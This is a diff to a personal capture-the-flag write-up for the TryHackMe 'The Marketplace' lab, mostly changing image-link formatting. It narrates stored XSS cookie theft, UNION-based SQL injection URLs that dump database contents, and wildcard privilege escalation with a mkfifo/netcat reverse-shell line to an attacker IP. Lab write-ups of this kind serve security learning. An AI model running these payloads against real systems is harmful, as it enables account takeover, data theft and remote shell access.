@@ -4,7 +4,7 @@ This is a write-up for the room on TryHackMe: [https://tryhackme.com/room/market
 
 Nmap scan: 
 
-```text
+```
 nmap -T4 -A 10.10.32.69 -oN nmapscan
 ```
 
@@ -38,71 +38,71 @@ Nmap done: 1 IP address (1 host up) scanned in 31.68 seconds
 
 I started off by visiting the main page on port 80:
 
-![](../../.gitbook/assets/image%20%28313%29.png)
+![](<../../.gitbook/assets/image (313).png>)
 
 There is a robots.txt, which was indicated in the nmap scan:
 
-![](../../.gitbook/assets/image%20%28302%29.png)
+![](<../../.gitbook/assets/image (302).png>)
 
 This leads to the following:
 
-![](../../.gitbook/assets/image%20%28315%29.png)
+![](<../../.gitbook/assets/image (315).png>)
 
 The same page is visible for the webserver on port 32768:
 
-![](../../.gitbook/assets/image%20%28318%29.png)
+![](<../../.gitbook/assets/image (318).png>)
 
-I signed up and made a new listing on the site. I then added **&lt;script&gt;alert\(document.cookie\)&lt;/script&gt;**, in the title to see if I can get some information:
+I signed up and made a new listing on the site. I then added **\<script>alert(document.cookie)\</script>**, in the title to see if I can get some information:
 
-![](../../.gitbook/assets/image%20%28310%29.png)
+![](<../../.gitbook/assets/image (310).png>)
 
 I seem to get a token. I found out that this is JWT or JSON Web Token. When I decoded it, this was my result:
 
-![](../../.gitbook/assets/image%20%28307%29.png)
+![](<../../.gitbook/assets/image (307).png>)
 
 I believe my next step is to change the payload data to have me be the admin, so I am allowed to view the page. I tried to modify the payload as admin, but I ended up failing. I found [this write-up](https://www.security-hive.com/post/tryhackme-the-marketplace-walkthrough), that led me to a website: [https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md](https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md). Using the github link, I first **ran the python script** mentioned in the github page, and then I tried the first option:
 
-![](../../.gitbook/assets/image%20%28301%29.png)
+![](<../../.gitbook/assets/image (301).png>)
 
 I then got this response from the website:
 
-![](../../.gitbook/assets/image%20%28293%29.png)
+![](<../../.gitbook/assets/image (293).png>)
 
 I then tried it again, this time removing the alert box code:
 
-![](../../.gitbook/assets/image%20%28316%29.png)
+![](<../../.gitbook/assets/image (316).png>)
 
 I then submitted the listing. Based on the hint from TryHackMe, I then reported this listing to the admins. 
 
-![](../../.gitbook/assets/image%20%28306%29.png)
+![](<../../.gitbook/assets/image (306).png>)
 
 At this point, I realized that I was making a mistake, and that I was entering the IP of the server itself, and not my own IP from TryHackMe. I then corrected my javascript:
 
-![](../../.gitbook/assets/image%20%28296%29.png)
+![](<../../.gitbook/assets/image (296).png>)
 
 When I reported it this time to the admin, I got the cookie using the python script from the GitHub page:
 
-![](../../.gitbook/assets/image%20%28300%29.png)
+![](<../../.gitbook/assets/image (300).png>)
 
 I entered this in [jwt.io](https://jwt.io/#debugger-io), and got the following result:
 
-![](../../.gitbook/assets/image%20%28299%29.png)
+![](<../../.gitbook/assets/image (299).png>)
 
-We can see the username of the admin is michael. I then logged out of the account. I then logged in using credentials I had made previously, **test:test**, and when the following prompt came up in burpsuite \(I used the burpsuite browser for this part\), I modified it to use the cookie of the admin: 
+We can see the username of the admin is michael. I then logged out of the account. I then logged in using credentials I had made previously, **test:test**, and when the following prompt came up in burpsuite (I used the burpsuite browser for this part), I modified it to use the cookie of the admin: 
 
-![](../../.gitbook/assets/image%20%28320%29.png)
+![](<../../.gitbook/assets/image (320).png>)
 
 I was then in:
 
-![](../../.gitbook/assets/image%20%28311%29.png)
+![](<../../.gitbook/assets/image (311).png>)
 
 In order to access **/admin**, you have to manually force the admin cookie in bupsuite. After I did that, I got to the following site:
 
-![](../../.gitbook/assets/image%20%28319%29.png)
+![](<../../.gitbook/assets/image (319).png>)
 
 I did the same for the **Administration Panel**, and got the first flag:
 
-![](../../.gitbook/assets/image%20%28314%29.png)
+![](<../../.gitbook/assets/image (314).png>)
 
 I see that jake is also an administrator. After a while, viewing [this write-up](https://www.security-hive.com/post/tryhackme-the-marketplace-walkthrough), made me realize that I should focus more on the SQL Injection than the user jake. Using the same write-up I ended up finding about the following web query:
 
@@ -112,7 +112,7 @@ http://10.10.8.149/admin?user=-2+union+select+1,(SELECT+group_concat(table_name)
 
 This led to the output that tolds what table names there are:
 
-![](../../.gitbook/assets/image%20%28317%29.png)
+![](<../../.gitbook/assets/image (317).png>)
 
 Running the following web query led to the column names:
 
@@ -120,7 +120,7 @@ Running the following web query led to the column names:
 http://10.10.8.149/admin?user=-2+union+select+1,(SELECT+group_concat(column_name)+from+information_schema.columns+where+table_schema=database()),3,4
 ```
 
-![](../../.gitbook/assets/image%20%28322%29.png)
+![](<../../.gitbook/assets/image (322).png>)
 
 From the write-up, the author then went on to make this query:
 
@@ -130,31 +130,31 @@ http://10.10.8.149/admin?user=-2+union+select+1,(SELECT+message_content+FROM+mes
 
 This led to the following output:
 
-![](../../.gitbook/assets/image%20%28309%29.png)
+![](<../../.gitbook/assets/image (309).png>)
 
 This seems to be the SSH password for a user. The credentials worked for jake:
 
-![](../../.gitbook/assets/image%20%28298%29.png)
+![](<../../.gitbook/assets/image (298).png>)
 
 The user.txt file was in the directory you enter in:
 
-![](../../.gitbook/assets/image%20%28304%29.png)
+![](<../../.gitbook/assets/image (304).png>)
 
-I then ran **sudo -l** to find out what actions we have as a sudoer:
+I then ran **sudo -l **to find out what actions we have as a sudoer:
 
-![](../../.gitbook/assets/image%20%28321%29.png)
+![](<../../.gitbook/assets/image (321).png>)
 
 I found out we have a file we have access to read. We do not have access to edit the file. I found [this website](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/), based on a couple of the write-ups I had read online, that talked about exploiting wildcards for privilege escalation. I followed the commands from the website:
 
 I first ran `cat /etc/cron` and got the following output:
 
-![](../../.gitbook/assets/image%20%28295%29.png)
+![](<../../.gitbook/assets/image (295).png>)
 
 There does not seem to be anything of importance here, so I moved on to the next step, which was creating a msfvenom payload:
 
-![](../../.gitbook/assets/image%20%28294%29.png)
+![](<../../.gitbook/assets/image (294).png>)
 
-We then copy the **mkfifo** output \(previous image\) into the jake user's shell \(in the **/opt/backups** directory\). I then ran the following commands, going off of [this write-up](https://yebberdog.medium.com/tryhackme-the-marketplace-writeup-3397db0c6dfb):
+We then copy the **mkfifo** output (previous image) into the jake user's shell (in the **/opt/backups** directory). I then ran the following commands, going off of [this write-up](https://yebberdog.medium.com/tryhackme-the-marketplace-writeup-3397db0c6dfb):
 
 ```c
 echo "mkfifo /tmp/rtez; nc 10.2.54.229 4444 0</tmp/rtez | /bin/sh >/tmp/rtez 2>&1; rm /tmp/rtez" > shell.sh
@@ -169,7 +169,7 @@ I ran into an issue here where I was not able to backup the files. I kept gettin
 
 After I ran the aforementioned commands, I had a reverse shell:
 
-![](../../.gitbook/assets/image%20%28312%29.png)
+![](<../../.gitbook/assets/image (312).png>)
 
 I then spawned a python shell here running the following command, from [this website](https://netsec.ws/?p=337):
 
@@ -177,13 +177,11 @@ I then spawned a python shell here running the following command, from [this web
 python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
-After I got the shell, I tried to run **sudo -l**, but that did not work out for me. I had to get the shell again and start over. I read [a write-up](https://www.infosecarticles.com/tryhackme-the-marketplace-walkthrough/) and found out we are part of the docker group. I also found out that I made a mistake copying a command from GTFOBins \(for the **docker** command\):
+After I got the shell, I tried to run **sudo -l**, but that did not work out for me. I had to get the shell again and start over. I read [a write-up](https://www.infosecarticles.com/tryhackme-the-marketplace-walkthrough/) and found out we are part of the docker group. I also found out that I made a mistake copying a command from GTFOBins (for the **docker** command):
 
-![](../../.gitbook/assets/image%20%28297%29.png)
+![](<../../.gitbook/assets/image (297).png>)
 
 I was not supposed to use sudo for this. I was then able to get the flag:
 
-![](../../.gitbook/assets/image%20%28305%29.png)
-
-
+![](<../../.gitbook/assets/image (305).png>)
 
